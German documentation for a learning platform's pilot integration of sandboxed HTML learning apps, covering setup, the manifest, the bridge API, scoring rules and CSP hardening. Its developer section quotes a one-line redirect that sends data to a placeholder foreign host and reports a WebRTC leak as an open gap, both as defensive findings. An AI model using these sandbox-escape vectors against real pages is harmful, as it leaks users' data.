# HTML-Apps einbinden

Eine HTML-App ist eine einzelne HTML-Datei, die alles mitbringt, zum Beispiel eine selbst
gebaute Lernapp. Über die hier beschriebene Schnittstelle meldet sie Lernstand, Ergebnisse und
Liveview ans Klassennotizbuch.

> **Stand:** Pilot, hinter der Freischaltung „HTML-Apps“. Ohne `HTML_APP_ORIGIN` ist sie nicht
> verfügbar (siehe „Einrichten“). In Chrome geprüft; Safari auf dem iPad steht noch aus.

## Einrichten

Die Apps brauchen eine eigene Adresse auf demselben Server, zum Beispiel
`lm-apps.schule.de`. Auf der Hauptadresse lägen sie beim Anmelde-Token.

1. DNS und Reverse Proxy: Die neue Adresse zeigt auf denselben Container wie die Hauptadresse.
2. Im Container `HTML_APP_ORIGIN=https://lm-apps.schule.de` setzen und neu starten.
3. Administration → Funktionen: „HTML-Apps“ freischalten.

Auf der App-Adresse antwortet der Server nur mit den beiden Rahmen, alles andere ist 404. Auf der
Hauptadresse gibt es die Rahmen nicht.

## App importieren

1. Lernthema öffnen, „Neues Modul“, Typ „🧩 HTML-App“ wählen (erscheint nur mit Freischaltung).
2. Titel eintragen und die `.html`-Datei auswählen. Die Datei wird sofort geprüft; darunter stehen
   die erkannten Abschnitte oder der Fehler im Steckbrief.
3. Speichern. Die Abschnitte erscheinen als Untermodule unter der App im Baum.
4. Das Lernthema oder einzelne Abschnitte wie gewohnt einer Klasse zuweisen.

Ein Update geht genauso: Modul bearbeiten, neue Datei wählen, speichern.

Zum Ausprobieren: [`html-app-beispiel.html`](html-app-beispiel.html) (klein) und
[`html-app-excel-beispiel.html`](html-app-excel-beispiel.html) (echte App).

## Zwei Wege der Nutzung

| Weg | `init.mode` | Stand | Ergebnisse, Liveview |
|---|---|---|---|
| Klassenlink oder Klassennotizbuch (mit Schülerausweis) | `practice` | auf dem Server, je Schüler | ja |
| Link ohne Klasse, Quick-Link (anonym) | `anonymous` | nur auf dem Gerät | nein |
| Vorschau der Lehrkraft | `preview` | nichts | nein |

Der anonyme Weg ist abschaltbar: Häkchen „Auch ohne Anmeldung nutzbar“ am Modul (Vorgabe: an).
Klassenlinks verlangen immer den Ausweis.

## Ohne Anpassung oder mit Schnittstelle

| | Ohne Schnittstelle | Mit Schnittstelle |
|---|---|---|
| App läuft im Lernthema | ja | ja |
| Abschnitte als Untermodule im Baum, je Klasse wählbar | nein, ein Modul | ja |
| Stand bleibt beim Neuladen und auf anderen Geräten | nein | ja |
| 📡 Liveview | nein | ja |
| 📊 Ergebnisse und Lernstand | nein | ja |

Ohne Schnittstelle zeigt die App den Hinweis „nur Anzeige, kein Lernstand“.

## Was die App tun muss, damit Ergebnisse ausgewertet werden

1. **Steckbrief** in den `<head>` schreiben: Welche Abschnitte gibt es?
2. **`lm-bridge.js` einfügen**, als Text in die Datei kopiert (Vorlage: [`src/renderer/lm-bridge.js`](../src/renderer/lm-bridge.js)).
3. **Mit `LM.start` beginnen:** Den gespeicherten Stand übernehmen, erst dann die Oberfläche aufbauen.
4. **Bei jeder Änderung melden:** `LM.saveState`, `LM.progress` und bei bewerteten Abschnitten `LM.result`.
5. **Auf `LM.onOpen` reagieren** und beim Wechsel `LM.enter` aufrufen.

Das ist die ganze App, vollständig und lauffähig:

```html
<!doctype html>
<html lang="de"><head><meta charset="utf-8"><title>Ohmsches Gesetz</title>
<script type="application/lm-app+json">
{ "lmApp": 1, "id": "ohm-trainer", "version": "1.0", "title": "Ohmsches Gesetz",
  "units": [
    { "id": "theorie", "title": "Theorie", "kind": "info" },
    { "id": "aufgaben", "title": "Aufgaben", "kind": "graded", "items": 2 } ] }
</script>
<script>/* hier der Inhalt von lm-bridge.js */</script>
</head><body>
<button id="richtig">Aufgabe a1 richtig lösen</button>
<script>
  let stand = { geloest: {} };
  function melden() {
    const done = Object.keys(stand.geloest).length;
    LM.saveState(stand);
    LM.progress('aufgaben', { done, total: 2 });
    LM.result('aufgaben', { score: done, max: 2 });
  }
  LM.start((init) => {
    if (init.state) stand = init.state;
    LM.enter(init.unit || 'theorie');
  });
  LM.onOpen((unit) => { /* diesen Abschnitt anzeigen */ LM.enter(unit); });
  document.getElementById('richtig').onclick = () => { stand.geloest.a1 = true; melden(); };
</script>
</body></html>
```

## Der Steckbrief

| Feld | Pflicht | Bedeutung |
|---|---|---|
| `lmApp` | ja | Fassung der Schnittstelle, jetzt `1` |
| `id` | ja | feste Kennung der App: `a-z`, `0-9`, `-`, höchstens 40 Zeichen |
| `version` | ja | Fassung der App, frei wählbar |
| `title` | ja | Name der App |
| `units` | ja | Abschnitte in Anzeigereihenfolge, höchstens 30 |
| `units[].id` | ja | feste Kennung wie `id`, **darf sich nie ändern** |
| `units[].title` | ja | Name in Baum und Übersicht |
| `units[].kind` | ja | `graded` mit Punkten, `practice` nur Fortschritt, `info` zählt mit dem Ansehen |
| `units[].items` | nein | Anzahl der Aufgaben, wenn sie feststeht |

Beim Update einer App ordnet die `id` eines Abschnitts sein Untermodul und die Ergebnisse wieder
zu. Ein neuer Abschnitt wird neu angelegt. Ein entfernter wird im Lernthema ausgeblendet, seine
Ergebnisse bleiben.

## Die Aufrufe

| Aufruf | Zweck |
|---|---|
| `LM.hosted` | `true`, wenn die App in LearningModules läuft |
| `LM.start(fn)` | **Pflicht.** Ruft `fn(init)` auf; läuft die App allein, sofort |
| `LM.onOpen(fn)` | Lehrkraft oder Baum öffnen einen Abschnitt: `fn(unitId)` |
| `LM.onError(fn)` | abgelehnte Meldung: `fn({ code, message })`; steht auch in der Konsole |
| `LM.enter(unit)` | Der Schüler ist jetzt in diesem Abschnitt |
| `LM.progress(unit, { done, total, item? })` | Fortschritt für den Liveview |
| `LM.result(unit, { score, max, items? })` | Ergebnis des Abschnitts |
| `LM.saveState(data)` | Stand speichern: JSON, höchstens 256 KB |
| `LM.flush()` | Gebündeltes sofort senden, z. B. nach „Abgeben“ |

`init` enthält:

| Feld | Bedeutung |
|---|---|
| `mode` | `practice` im Durchlauf mit Anmeldung, `anonymous` ohne Anmeldung (Stand nur auf dem Gerät, keine Ergebnisse), `preview` in der Vorschau der Lehrkraft (nichts wird gespeichert), `standalone` ohne Gastgeber |
| `unit` | Abschnitt, mit dem die App starten soll, oder `null` |
| `enabledUnits` | Abschnitte, die diese Klasse hat, `null` ohne Einschränkung |
| `state` | zuletzt gespeicherter Stand oder `null` |
| `displayName` | `null`, solange es keine ausdrückliche Einstellung dafür gibt: Die App soll keine Schülerdaten kennen |

## Regeln für die Auswertung

- **Immer der Gesamtstand, nie der Zuwachs.** `LM.result` und `LM.progress` ersetzen die vorige
  Meldung. Sie dürfen also oft und mehrfach kommen; die Bridge bündelt sie und sendet nur die letzte.
- **Punkte:** `score` zwischen 0 und `max`, `max` größer als 0. Angezeigt wird `score / max` in Prozent.
- **Einzelaufgaben (freiwillig):** `items: [{ id, label?, points }]` mit `points` von 0 bis 1 machen
  die Aufgaben in den Details sichtbar, höchstens 500. Es genügen die bearbeiteten.
- **Feste IDs für Aufgaben.** Nicht der Listenplatz, sonst rutschen die Ergebnisse beim Einfügen einer Aufgabe.
- **Musterlösung zählt nicht.** Eine Aufgabe, deren Lösung die App eingetragen hat, darf nicht als gelöst gelten.
- **Das Ergebnis ist eine Selbstauskunft.** Die App läuft im Browser, die Lösungen stehen in ihrem
  Quelltext. Das Notizbuch zeigt die Werte deshalb als „von der App gemeldet“. Über den Link der
  Klassenarbeit läuft eine HTML-App nicht.
- **Eingeschränkte Abschnitte:** `enabledUnits` nur als Komfort verstehen. Die App blendet die
  übrigen aus, kann aber nicht verhindern, dass jemand im Quelltext nachliest. Was Schüler nicht
  sehen dürfen, gehört nicht in die Datei.

## Was wo erscheint

| Meldung | Stelle |
|---|---|
| Steckbrief | Untermodule im Baum, Spalten in der Übersicht, Auswahl je Klasse |
| `LM.enter` | 📡 Live: „gerade dran“ |
| `LM.progress` | 📡 Live: Stand wie „12/40“, fertig bei `done = total` |
| `LM.result` | 📊 Ergebnisse und Stand des Schülers, je Schüler und Abschnitt ein Eintrag |
| `kind: info` | zählt beim Ansehen als bearbeitet, ohne Prozent |
| `LM.saveState` | wieder in `init.state` beim nächsten Start, auch auf einem anderen Gerät |

Stand und Ergebnisse brauchen einen Klassenlink mit Schülerausweis. Über einen Link ohne Klasse
bleibt der Stand nur auf dem Gerät.

**Im Pilot noch nicht:** Einzelaufgaben (`items`) werden gespeichert, aber nicht angezeigt.
Notebook-Export und GitHub-Backup enthalten die HTML-Datei nicht, nur ihre Kennung. `LM.onOpen`
wird noch nie ausgelöst; den Startabschnitt liefert `init.unit`.

## Was im Sandkasten geht

**Geht:** Skripte und Stile in der Datei, Bilder und Schriften als `data:`, Formulare,
`confirm()`, `print()`, Dateien herunterladen (`<a download>`, `Blob`).

**Geht nicht** (in Chrome geprüft, außer `print()` und dem Herunterladen; Safari auf dem iPad steht noch aus):

| Nicht möglich | Stattdessen |
|---|---|
| `localStorage`, Cookies | `LM.saveState`; Zugriffe in `try/catch` setzen, sie werfen `SecurityError` |
| `fetch`, Bilder oder Skripte von außen, CDNs, KI-Dienste | alles in die Datei packen |
| Wechsel zu einer anderen Adresse, auch über Links, neue Fenster | keine externen Links in der App |
| Zugriff auf die umgebende Seite, Anmeldung, Schülerdaten | nur die Felder aus `init` |

## Wenn nichts ankommt

| Beobachtung | Ursache |
|---|---|
| App bleibt leer | `LM.start` fehlt oder die Oberfläche wird außerhalb davon aufgebaut |
| Stand ist nach dem Neuladen weg | `LM.saveState` fehlt, oder Stand über 256 KB |
| Abschnitt fehlt im Baum | Steckbrief ungültig; das Hochladen nennt den Fehler |
| Meldung wird verworfen | `unit` nicht im Steckbrief, `score` außerhalb von 0 bis `max`; siehe `LM.onError` |
| Ergebnisse nach einem Update doppelt | `units[].id` wurde geändert |
| Kein Lernstand in der Vorschau | richtig so: `mode: preview` speichert nichts |

## Prompt für eine KI

Wer eine App von einer KI bauen oder umbauen lässt, gibt ihr diese Datei und `lm-bridge.js` mit:

```text
Baue die App als eine einzige HTML-Datei ohne Netzzugriff: keine CDNs, keine externen Schriften,
kein fetch; Bilder als data:. Binde die Schnittstelle aus html-apps.md ein:
Steckbrief im <head> mit festen IDs, lm-bridge.js als Text in die Datei kopiert, Start über LM.start.
Melde nach jeder Änderung den Gesamtstand mit LM.saveState, LM.progress und LM.result.
Jede Aufgabe bekommt eine feste ID statt des Listenplatzes. Eine von der App eingetragene
Musterlösung zählt nicht als gelöst. Schreibe keine Klassenarbeiten oder geheimen Lösungen in die Datei.
Die App muss auch allein laufen, wenn sie direkt geöffnet wird.
```

## Beispiel: Excel-Lernapp

[`html-app-excel-beispiel.html`](html-app-excel-beispiel.html) ist eine echte App (rund 430 KB) mit
der Schnittstelle. Allein geöffnet läuft sie weiter wie bisher mit `localStorage`.

| Abschnitt | Art | Wert |
|---|---|---|
| Formel-Labor, Lernsituationen, Diagramme | `graded` | gelöste Aufgaben von allen |
| Quiz, Zellbezüge, Datentypen, Oberfläche | `graded` | richtige von allen Versuchen, erst ab dem ersten Versuch |
| Formeln, Funktionen, Kalkulation, E-Technik | `info` | zählt mit dem Öffnen |
| Start, Lernstand, Arbeitsblatt, Probearbeit | kein Abschnitt | immer sichtbar, ohne Meldung |

Was beim Umbau wichtig war:

- **Stand an einer Stelle:** `save()` ruft `LM.saveState` und meldet danach nur, was sich geändert hat.
  Sonst schickt jede kleine Änderung (auch Reiterwechsel) alle Abschnitte und gerät an die Grenze
  von 120 Meldungen je Minute.
- **Nichts melden, was nicht geübt wurde:** Eine Meldung mit 0 Punkten zählt in der Übersicht als
  „bearbeitet“. Die erste Meldung kommt deshalb erst beim ersten Treffer.
- **Musterlösung:** „Lösung eintragen“ merkt sich die Aufgabe in `S.labHelp`, sie zählt nicht. Erst
  „Zurücksetzen“ oder neue Werte heben das auf; dann muss sie wieder selbst gelöst werden.
- **Abschnitt ohne eigenen Reiter:** Die Lernsituationen liegen im Reiter Formel-Labor; `lmUnitOf`
  und `lmOpen` übersetzen zwischen Reiter und Abschnitt.
- **Klassenarbeit wird Probearbeit:** Die Lösungen stehen in der Datei. In LearningModules heißt der
  Reiter deshalb so und meldet keine Ergebnisse.
- **Zwischenablage:** Sie ist im Sandkasten gesperrt, die App zeigt den Code stattdessen im Dialog.

Noch offen: Die Aufgaben im Labor zählen über ihren Listenplatz. Neue Aufgaben gehören deshalb ans
Ende der Liste, sonst rutscht der gespeicherte Stand. Quiz und Trainer melden Versuche seit dem
letzten Zurücksetzen, keinen Stand je Aufgabe. „Lösung anzeigen“ in den Lernsituationen wird nicht erfasst.

## Festlegungen

| Thema | Regel |
|---|---|
| Hochladen | Lehrkräfte mit Freischaltung |
| Shop | ein Angebot lässt HTML-Apps aus; nur ein Admin kann die Sperre am Modul aufheben (`shopAllowed`, noch ohne Oberfläche) |
| Klassenarbeit | nie über den Link der Klassenarbeit |
| Netz | kein Zugriff |
| Untermodule | je Abschnitt ein echtes Untermodul, zugeordnet über `units[].id` |

## Für Entwickler

Die Bridge ist nur eine Hülle um `postMessage`. Nachrichten sehen so aus:
`{ lm: 1, type, data }`.

| Richtung | `type` | `data` |
|---|---|---|
| App → Rahmen | `lm.ready` | `{}` |
| Rahmen → App | `lm.init` | Felder von `init` |
| Rahmen → App | `lm.open` | `{ unit }` |
| Rahmen → App | `lm.error` | `{ code, message }` |
| App → Rahmen | `lm.progress` | `{ unit, active }` oder `{ unit, done, total, item }` |
| App → Rahmen | `lm.result` | `{ unit, score, max, items }` |
| App → Rahmen | `lm.state` | `{ data }` |

- Der Rahmen nimmt nur Nachrichten an, deren `event.source` das eigene iframe ist. Der Ursprung ist `null`, er taugt nicht zur Prüfung.
- Er prüft Felder und Größen selbst und sendet mit dem Schülerausweis an den Server. Die App sieht den Ausweis nie.
- Inhalte aus Steckbrief und Meldungen (`title`, `label` …) sind fremder Text: überall escapen.
- Ausgeliefert wird die Datei auf einer eigenen Adresse mit diesem Kopf:

```text
Content-Security-Policy: sandbox allow-scripts allow-modals allow-downloads allow-forms;
  default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:;
  font-src data:; media-src data: blob:; connect-src 'none'; form-action 'none'; base-uri 'none'
```

- Die Hauptseite prüft `event.origin` (App-Adresse) und `event.source`, die Rahmenseite dazwischen
  leitet nur die festgelegten Nachrichten weiter. Beide Adressen tragen `frame-ancestors`.
- **Das reicht allein nicht:** `connect-src` hält keinen Seitenwechsel auf. Ohne weiteren Schutz
  sendet `location.href = 'https://fremd/?name=…'` Daten nach außen (in Chrome nachgewiesen). Die Seite
  mit dem iframe muss deshalb `Content-Security-Policy: frame-src 'self'` tragen; damit kam im Test
  nichts mehr an. Die Hauptseite bettet auch fremde Inhalte ein, also braucht die App eine eigene
  Rahmenseite oder Subdomain.
- **Offener Rest:** `RTCPeerConnection` erreicht fremde Server auch mit `webrtc 'block'` (in Chrome
  kamen STUN-Pakete an). Eine böswillige App kann also, was sie weiß, nach außen tragen. Deshalb gibt
  der Rahmen ihr so wenig wie möglich mit; siehe `displayName`.
